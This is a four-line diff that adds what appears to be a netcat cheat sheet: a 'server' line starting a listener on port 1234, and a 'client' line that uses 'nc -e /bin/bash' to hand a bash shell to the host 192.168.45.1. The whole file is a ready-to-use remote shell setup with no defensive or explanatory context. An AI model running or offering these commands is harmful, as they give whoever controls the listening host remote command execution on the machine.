@@ -1,0 +1,4 @@
+server
+	nc -n -v -l -p 1234
+client
+	nc -e /bin/bash 192.168.45.1 1234
